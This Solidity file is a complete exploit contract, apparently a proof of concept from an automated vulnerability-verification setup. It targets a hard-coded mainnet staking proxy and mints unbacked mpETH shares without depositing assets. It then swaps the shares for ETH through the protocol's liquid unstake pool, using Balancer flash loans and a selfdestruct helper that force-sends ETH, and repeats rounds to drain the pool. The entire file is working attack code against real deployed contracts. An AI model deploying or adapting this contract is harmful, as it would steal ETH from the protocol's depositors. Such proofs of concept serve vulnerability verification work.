// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETH is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IStakingLike is IERC20Like {
    function mint(uint256 shares, address receiver) external returns (uint256 assets);
    function liquidUnstakePool() external view returns (address);
    function previewMint(uint256 shares) external view returns (uint256 assets);
}

interface ILiquidUnstakePoolLike {
    function getAmountOut(uint256 amountIn) external view returns (uint256 amountOut, uint256 feeAmount);
    function swapmpETHforETH(uint256 amount, uint256 minOut) external returns (uint256 amountOut);
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract ForceEther {
    constructor() payable {}

    function boom(address payable target) external {
        selfdestruct(target);
    }
}

contract FlawVerifier is IFlashLoanRecipient {
    address internal constant TARGET_PROXY = 0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    uint256 internal constant MIN_SHARES = 0.01 ether;
    uint256 internal constant HARVEST_TARGET = 0.1 ether;
    uint256 internal constant MIN_REQUIRED_PROFIT = 1;
    uint256 internal constant MAX_ROUNDS = 8;

    address internal realizedProfitToken;
    uint256 internal realizedProfitAmount;

    constructor() payable {}

    receive() external payable {}

    function executeOnOpportunity() external {
        uint256 nativeBefore = address(this).balance;

        // exploit_paths[1]: read `liquidUnstakePool()` from `TARGET_PROXY`.
        address liquidPool = IStakingLike(TARGET_PROXY).liquidUnstakePool();
        require(liquidPool != address(0), "liquidUnstakePool() returned zero");
        require(liquidPool.balance != 0, "liquid pool has no ETH");

        // The failing run showed that harvesting only a tiny quoted amount realizes profit,
        // but not enough to satisfy the PoC threshold. A realistic attacker would repeat the
        // same mint->approve->swap path and size each round against current pool inventory.
        for (uint256 round = 0; round < MAX_ROUNDS; ++round) {
            if (liquidPool.balance < MIN_SHARES) {
                break;
            }

            uint256 roundStart = address(this).balance;
            uint256 bestAmount = _findBestMintAmount(liquidPool);
            if (bestAmount < MIN_SHARES) {
                break;
            }

            bool success = _tryCandidateSeries(liquidPool, bestAmount);
            if (!success) {
                break;
            }

            if (address(this).balance <= roundStart) {
                break;
            }

            if (address(this).balance - nativeBefore >= HARVEST_TARGET) {
                break;
            }
        }

        realizedProfitToken = address(0);
        realizedProfitAmount = address(this).balance - nativeBefore;
        require(realizedProfitAmount >= MIN_REQUIRED_PROFIT, "no net ETH profit realized");
    }

    function attemptCandidate(address liquidPool, uint256 desiredShares) external {
        require(msg.sender == address(this), "self-call only");

        // First try the exploit exactly as claimed: mint first, without funding assets.
        try this.attemptWithoutTopUp(liquidPool, desiredShares) {
            return;
        } catch {}

        // If the inherited mint path still assumes some ETH is already parked on the target,
        // use a realistic public funding step as a fallback. The top-up remains causally prior
        // to the vulnerable mint and is repaid from the post-swap ETH, preserving the same path.
        uint256 shortfall = _fundingShortfallHint(desiredShares);
        require(shortfall != 0, "candidate failed without top-up");

        (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, desiredShares);
        require(quoteOk && quotedOut > 1, "candidate has no repayable swap quote");

        if (shortfall >= quotedOut) {
            shortfall = quotedOut - 1;
        }

        IERC20Like[] memory tokens = new IERC20Like[](1);
        tokens[0] = IERC20Like(WETH);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = shortfall;

        // exploit_paths[2]: optionally top up `TARGET_PROXY` with forced ETH to satisfy internal
        // execution assumptions, using only public capital sourced in this transaction.
        IBalancerVault(BALANCER_VAULT).flashLoan(this, tokens, amounts, abi.encode(liquidPool, desiredShares));
    }

    function attemptWithoutTopUp(address liquidPool, uint256 desiredShares) external {
        require(msg.sender == address(this), "self-call only");
        _executePath(liquidPool, desiredShares, 0, 0);
    }

    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external override {
        require(msg.sender == BALANCER_VAULT, "unauthorized flashloan callback");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "unexpected flashloan shape");
        require(address(tokens[0]) == WETH, "unexpected flashloan token");

        (address liquidPool, uint256 desiredShares) = abi.decode(userData, (address, uint256));

        IWETH(WETH).withdraw(amounts[0]);
        _executePath(liquidPool, desiredShares, amounts[0], feeAmounts[0]);

        uint256 repayment = amounts[0] + feeAmounts[0];
        require(address(this).balance >= repayment, "swap proceeds cannot repay flashloan");

        IWETH(WETH).deposit{value: repayment}();
        _safeTransfer(WETH, BALANCER_VAULT, repayment);
    }

    function profitToken() external view returns (address) {
        return realizedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitAmount;
    }

    function _tryCandidateSeries(address liquidPool, uint256 seedAmount) internal returns (bool success) {
        uint256[8] memory candidates = [
            seedAmount,
            (seedAmount * 7) / 8,
            (seedAmount * 3) / 4,
            (seedAmount * 2) / 3,
            seedAmount / 2,
            seedAmount / 3,
            seedAmount / 4,
            MIN_SHARES
        ];

        uint256 previousCandidate;
        for (uint256 i = 0; i < candidates.length; ++i) {
            uint256 candidate = candidates[i];
            if (candidate < MIN_SHARES || candidate == previousCandidate) {
                continue;
            }

            previousCandidate = candidate;
            try this.attemptCandidate(liquidPool, candidate) {
                return true;
            } catch {}
        }
    }

    function _executePath(
        address liquidPool,
        uint256 desiredShares,
        uint256 temporaryEth,
        uint256 flashloanFee
    ) internal {
        uint256 mpEthBefore = _balanceOf(TARGET_PROXY, address(this));
        require(liquidPool != address(0), "liquid pool missing");

        if (temporaryEth != 0) {
            ForceEther helper = new ForceEther{value: temporaryEth}();
            helper.boom(payable(TARGET_PROXY));
        }

        // exploit_paths[3]: call `mint(desiredShares, address(this))` without first transferring
        // backing assets through the ordinary deposit flow.
        IStakingLike(TARGET_PROXY).mint(desiredShares, address(this));

        uint256 mintedShares = _balanceOf(TARGET_PROXY, address(this)) - mpEthBefore;
        require(mintedShares != 0, "mint path produced zero mpETH");

        // exploit_paths[4]: approve the freshly minted mpETH to the liquid unstake pool.
        _safeApprove(TARGET_PROXY, liquidPool, 0);
        _safeApprove(TARGET_PROXY, liquidPool, mintedShares);

        (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, mintedShares);
        require(quoteOk && quotedOut != 0, "getAmountOut(uint256) unavailable after mint");
        require(quotedOut > flashloanFee, "quote cannot even cover flashloan fee");

        uint256 nativeBeforeSwap = address(this).balance;

        // exploit_paths[5]: call `swapmpETHforETH()` to convert the unbacked mpETH into ETH.
        uint256 amountOut = ILiquidUnstakePoolLike(liquidPool).swapmpETHforETH(mintedShares, 0);

        uint256 nativeDelta = address(this).balance - nativeBeforeSwap;
        require(nativeDelta != 0, "swap returned zero ETH");
        require(amountOut == nativeDelta, "swap return mismatch");

        if (temporaryEth != 0) {
            require(nativeDelta > temporaryEth + flashloanFee, "top-up branch is not profitable");
        }
    }

    function _findBestMintAmount(address liquidPool) internal view returns (uint256 bestAmount) {
        uint256 poolHeldShares = _balanceOf(TARGET_PROXY, liquidPool);
        uint256 poolEth = liquidPool.balance;
        if (poolHeldShares < MIN_SHARES || poolEth == 0) {
            return 0;
        }

        uint256[10] memory probes = [
            poolHeldShares,
            (poolHeldShares * 7) / 8,
            (poolHeldShares * 3) / 4,
            (poolHeldShares * 2) / 3,
            poolHeldShares / 2,
            poolHeldShares / 3,
            poolHeldShares / 4,
            poolHeldShares / 8,
            poolHeldShares / 16,
            MIN_SHARES
        ];

        uint256 bestEstimatedProfit;
        uint256 previousProbe;

        for (uint256 i = 0; i < probes.length; ++i) {
            uint256 probe = probes[i];
            if (probe < MIN_SHARES || probe == previousProbe) {
                continue;
            }

            previousProbe = probe;

            (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, probe);
            if (!quoteOk || quotedOut == 0 || quotedOut > poolEth) {
                continue;
            }

            uint256 shortfall = _fundingShortfallHint(probe);
            if (shortfall >= quotedOut) {
                continue;
            }

            uint256 estimatedProfit = quotedOut - shortfall;
            if (estimatedProfit > bestEstimatedProfit) {
                bestEstimatedProfit = estimatedProfit;
                bestAmount = probe;
            }
        }
    }

    function _fundingShortfallHint(uint256 desiredShares) internal view returns (uint256 shortfall) {
        if (desiredShares == 0) {
            return 0;
        }

        try IStakingLike(TARGET_PROXY).previewMint(desiredShares) returns (uint256 ethNeeded) {
            uint256 targetNativeBalance = TARGET_PROXY.balance;
            if (ethNeeded > targetNativeBalance) {
                shortfall = ethNeeded - targetNativeBalance;
            }
        } catch {
            shortfall = 0;
        }
    }

    function _quoteSwap(address liquidPool, uint256 amountIn) internal view returns (bool ok, uint256 amountOut) {
        try ILiquidUnstakePoolLike(liquidPool).getAmountOut(amountIn) returns (uint256 quotedOut, uint256) {
            return (true, quotedOut);
        } catch {
            return (false, 0);
        }
    }

    function _balanceOf(address token, address account) internal view returns (uint256 balance) {
        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
        );
        if (ok && data.length >= 32) {
            balance = abi.decode(data, (uint256));
        }
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}
